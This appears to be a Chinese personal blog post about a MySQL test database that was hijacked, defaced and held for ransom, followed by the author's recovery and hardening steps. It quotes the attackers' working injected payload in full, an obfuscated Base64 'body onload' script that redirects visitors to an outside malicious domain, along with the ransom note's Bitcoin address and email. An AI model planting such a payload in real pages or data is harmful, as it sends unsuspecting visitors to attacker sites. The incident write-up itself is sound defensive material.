---
layout: post
title: 运维｜MySQL 数据库被黑，心力交瘁
categories: [Linux, Database]
description: MySQL 被黑了，至少要会做这些事来恢复数据。
keywords: Linux, MySQL, Database
mermaid: false
sequence: false
flow: false
mathjax: false
mindmap: false
mindmap2: false
---

前一阵有一个测试用的 MySQL 数据库被黑了，删库勒索的那种，这里记录一下事情经过，给自己也敲个警钟。

## 0x00 发现端倪

有一天，我在自测功能的时候，发现 APP 里展示的每条详情信息里都有一段乱码，只是有点奇怪，没有特别在意，后来调试网页的时候看到控制台有个报错，就顺手看了一眼，发现详情网页里有这样的东西：

![body-onload](/images/posts/database/body-onload.png)

找我的前端小伙伴讨论了下，最后本地调试了一番，发现是数据库里有个字段齐刷刷地被改成这个了：

```
<body/onload=eval(atob("d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHBzOi8vaHpyMGRtMjhtMTdjLmNvbS9lYm1zczBqcTc/a2V5PWM5MGEzMzYzMDEzYzVmY2FhZjhiZjVhOWE0ZTQwODZhIik="))>
```

atob 里面这一串是被 Base64 编码的 `window.location.replace("https://xxx.com/xxx")`，所以这段代码如果在网页里被正常加载，网页会被自动重定向到一个邪恶的网址：

![fake-security-tips](/images/posts/database/fake-security-tips.png)

是不是挺可怕？浏览网页的人如果警惕性不高，可能就中招了。这时我明白过来，我的测试环境这是被当成肉鸡了……

不过当时还是大意了，因为暂时没有想通它是怎样攻击和篡改，以为就是从页面注入的，就在逻辑里加了一些防护逻辑，把这个字段值都改回去然后就继续干活了。

## 0x01 库没人懵

到第二天，正欢乐地测着功能呢，突然打开啥页面都报数据库异常了，到库里一看，好家伙，所有表都没了，只剩一张 readme，里面写着：

> 以下数据库已被删除：xxx。 我们有完整的备份。 要恢复它，您必须向我们的比特币地址bc1q8erv6l4xrdqsfpwp92gm0mccur49pqn8l8epfg支付0.016比特币（BTC）。 如果您需要证明，请通过以下电子邮件与我们联系。 song4372@proton.me 。 任何与付款无关的邮件都将被忽略！

事情没我想象的简单！能把库里的表都删了，数据库和服务器的权限怕是都被拿到了。

仔细回想了前一段时间里发生的事情，推测过程可能是这样的：

- 最开始，有一天接收到阿里云的告警，提示 AK 泄漏，查看事件日志发现利用 AK 创建了一个 RAM 子账号，并赋予了高权限，当时我禁用了涉及的 AK，删除了被创建的子账号，但服务器应该已经被渗透了；
- 然后就是数据库字段被篡改，估计是一方面把服务器资源作为肉鸡继续扩散攻击其它人，另一方面作为诱饵，监控处理动作；
- 最后就是删库勒索了。

## 0x02 夺回权限

当务之急，是夺回权限，恢复数据。整个服务器和数据库的权限应该都不安全了，所以我先采取了以下措施：

- 检查服务器安全组规则，发现被加入了允许公网访问 3306 和所有端口的记录，将其删除；
- 检查服务器上的用户，发现多了一个用户 `guest`，uid 0，将其禁用；
- 检查进程，发现有用 `guest` 用户启动的 bash 进程和 mysql root 用户进程，将其 kill 掉；
- 修改服务器所有用户密码，检查用户权限；
- 修改数据库端口、重置所有用户和密码，只赋予用户必要权限；
- 更新服务器，修复已知安全漏洞；

用到的主要指令：

```sh
# 检查 Linux 服务器上的用户
cat /etc/passwd

# 修改用户密码
passwd <username>

# 检查进程
ps -ef 

# 杀掉进程
kill -9 <pid>

# 修改数据库端口
vim /etc/my.cnf

# mysql 删除用户，在 mysql 命令行执行
drop user '<user_name>'@'<scope>';
# mysql 创建用户，赋予权限，在 mysql 命令行执行
create user '<user_name>'@'<scope>' IDENTIFIED BY '<password>';
grant select,insert,update,delete on '<database_name>'.* to '<user_name>'@'<scope>';
```

## 0x03 修复数据

接下来就是修复数据了。

这个测试用的 MySQL 实例开启了 binlog，可惜被攻击者清除了，所以只能从备份恢复了。数据用定时任务 + mysqldump，每天备份一次，找到合适的备份，恢复数据。

*ps: 幸亏有备份，不然真是欲哭无泪了。*

```sh
# 解压备份文件
gunzip -c xxx.sql.gz > xxx.sql

# 恢复数据，在 mysql 命令行执行
use <database_name>;
souce /path/to/xxx.sql;
```

## 0x04 小结

以上的步骤的操作过程，远没有看起来那么简单，实际耗费了我挺长时间。

这次事件让我深刻地意识到，安全问题不容忽视，不管是服务器还是数据库，都要做好安全措施，不要给攻击者可乘之机。不然真到了被攻击，而又自行恢复无望的时候，那就叫天天不应，叫地地不灵了。退一万步说，即使有备份，也会耗费大量的时间和精力，影响正常的工作和生活。

安全任重道远，后续先做好以下方面：

- 访问控制，只赋予必要权限；
- 服务器镜像、数据库定期备份；
- 定期漏洞扫描与修复；
- 敏感数据加密；
- 操作审计；

最后，**警钟常鸣！**
